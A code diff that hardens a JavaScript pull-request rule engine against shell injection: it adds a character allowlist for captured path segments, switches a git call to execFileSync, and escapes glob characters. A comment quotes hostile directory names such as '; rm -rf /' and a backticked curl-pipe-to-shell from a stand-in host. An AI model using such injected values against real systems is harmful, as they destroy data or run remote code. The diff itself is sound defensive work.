@@ -18,9 +18,36 @@
  *   label    a human gesture. Deliberate, traceable, and not cryptographic.
  */
 
-import { execSync } from 'node:child_process'
+import { execFileSync, execSync } from 'node:child_process'
 import { added, touched } from './changed.mjs'
-import { matchList, substitute } from './glob.mjs'
+import { escapeGlob, matchList, substitute, substituteStrict } from './glob.mjs'
+
+/**
+ * What a captured path segment must look like before it can be interpolated
+ * into a shell string a `command` requirement runs.
+ *
+ * A capture binds to `[^/]+` (see glob.mjs), and a repository lets a
+ * contributor name a directory almost anything — including `; rm -rf /` or
+ * `` `curl evil.sh | sh` ``. Quoting does not save you here: backticks and
+ * `$(...)` are still expanded by the shell inside double quotes, which is
+ * exactly what `JSON.stringify` produces. The fix is not better escaping, it
+ * is refusing to run the command at all when a capture falls outside a
+ * conservative allowlist of characters no shell gives special meaning to.
+ */
+const SAFE_CAPTURE = /^[\w.@+-]+$/
+
+/**
+ * The first captured value (name and value) that is not safe to interpolate
+ * into a shell command, or `null` when every binding is.
+ * @param {Record<string,string>} bindings
+ * @returns {{ name: string, value: string }|null}
+ */
+function unsafeCapture(bindings) {
+  for (const [name, value] of Object.entries(bindings)) {
+    if (!SAFE_CAPTURE.test(value)) return { name, value }
+  }
+  return null
+}
 
 /**
  * @typedef {Object} Requirement
@@ -76,16 +103,29 @@ function triggers(rule, paths) {
 
 /**
  * Did this path change in a way that is more than whitespace?
+ *
+ * `--name-only` (even under `-w`) lists a file whenever its blob differs at
+ * all, ignore-whitespace or not — it names files, it does not measure diffs.
+ * `--numstat` is what actually applies `-w`'s notion of "changed": a file
+ * whose only edits are whitespace reports as no lines added or removed, and
+ * disappears from the output entirely.
+ *
+ * Built with `execFileSync` and a real argv, not a shell string: `path` is a
+ * captured directory name from the change set, so it is exactly the kind of
+ * value a hostile branch controls (see `SAFE_CAPTURE` above). Passing it as
+ * an argument rather than interpolating it into a command line means there
+ * is no shell here for it to break out of.
  * @param {import('./changed.mjs').Range} range
  */
 function changedBeyondWhitespace(range, path) {
   if (!range.base) return true
   try {
-    const diff = execSync(
-      `git diff -w --name-only ${range.base}...${range.head} -- ${JSON.stringify(path)}`,
+    const out = execFileSync(
+      'git',
+      ['diff', '-w', '--numstat', `${range.base}...${range.head}`, '--', path],
       { encoding: 'utf8' },
     )
-    return diff.trim().length > 0
+    return out.trim().length > 0
   } catch {
     return true // Never fail a pull request because the whitespace probe itself broke.
   }
@@ -127,8 +167,24 @@ export function evaluate({ rules, changes, range, labels = [], plan = false }) {
         }
 
         if (req.kind === 'command') {
-          const run = substitute(req.run, bindings)
           if (plan) continue // A plan describes what will run; it does not run it.
+
+          // `req.run` is an author-written shell string (it can legitimately use
+          // `&&`, pipes, redirection), so unlike the whitespace probe it cannot
+          // simply move to execFileSync — the shape genuinely needs a shell.
+          // What it must not do is hand that shell a value the change set
+          // controls. Refuse the rule rather than run it.
+          const bad = unsafeCapture(bindings)
+          if (bad) {
+            violations.push({
+              ...base,
+              required: `a capture safe to run in a shell command`,
+              detail: `capture "${bad.name}" = ${JSON.stringify(bad.value)} contains a character outside ${SAFE_CAPTURE}; refusing to substitute it into \`${req.run}\``,
+            })
+            continue
+          }
+
+          const run = substitute(req.run, bindings)
           try {
             execSync(run, { stdio: 'pipe', encoding: 'utf8' })
           } catch (err) {
@@ -141,7 +197,25 @@ export function evaluate({ rules, changes, range, labels = [], plan = false }) {
           continue
         }
 
-        const wanted = req.paths.map((p) => substitute(p, bindings))
+        // `substituteStrict`, not `substitute`: this result is re-compiled as a
+        // pattern by `matchList` below, so a leftover `{name}` (a rule that
+        // references a capture its own `when` never binds) must not be allowed
+        // to silently degrade into a wildcard — that is the false reassurance
+        // this engine exists to catch, not cause. A rule-authoring mistake
+        // reports as a violation naming the problem, not a crash.
+        // Values are escaped on the way in for the same reason they are checked
+        // before reaching a shell: a capture is a real path segment, so a
+        // directory named `evil*` would otherwise arrive as a live wildcard and
+        // widen the very requirement it is meant to pin down. The pattern's own
+        // globs, written by the rule author, are left intact.
+        const safe = Object.fromEntries(Object.entries(bindings).map(([k, v]) => [k, escapeGlob(v)]))
+        let wanted
+        try {
+          wanted = req.paths.map((p) => substituteStrict(p, safe))
+        } catch (err) {
+          violations.push({ ...base, required: `a well-formed rule`, detail: err.message })
+          continue
+        }
         const pool = req.kind === 'added' ? addedPaths : touchedPaths
         let hits = pool.filter((p) => matchList(wanted, p))
 
